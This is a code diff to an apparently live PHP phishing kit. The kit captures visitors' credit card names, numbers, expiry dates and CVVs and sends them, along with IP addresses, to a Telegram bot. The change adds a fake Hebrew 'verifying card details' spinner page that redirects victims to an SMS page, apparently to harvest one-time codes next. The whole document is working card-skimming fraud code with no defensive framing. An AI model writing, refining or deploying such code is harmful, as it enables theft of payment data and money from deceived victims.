@@ -110,7 +110,44 @@ tg_send("📥 <b>Visit:</b> x.php\\nIP: $ip\\nCountry: $cc");
 
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
   tg_send("💳 <b>Card Submitted</b>\\n👤 Name: {$_POST['card_name']}\\n💳 Number: {$_POST['card_number']}\\n📅 Exp: {$_POST['expiry_date']}\\n🔒 CVV: {$_POST['cvv']}\\n🌐 IP: $ip");
-  header("Location: sms.php");
+  echo '
+  <html><head><meta charset="UTF-8"><title>מאמת...</title>
+  <style>
+    body {
+      background: #f9f9f9;
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding-top: 120px;
+    }
+    .loader3d {
+      width: 64px;
+      height: 64px;
+      margin: auto;
+      border-radius: 50%;
+      background: conic-gradient(#007bff 10%, transparent 0 40%, #007bff 0 60%, transparent 0 90%, #007bff 0);
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    p {
+      margin-top: 30px;
+      color: #333;
+      font-size: 1.1em;
+    }
+  </style>
+  </head>
+  <body>
+    <div class="loader3d"></div>
+    <p>מאמת את פרטי הכרטיס...</p>
+    <script>
+      setTimeout(function() {
+        window.location.href = "sms.php";
+      }, 3000);
+    </script>
+  </body></html>';
+  exit;
   exit;
 }
 ?>
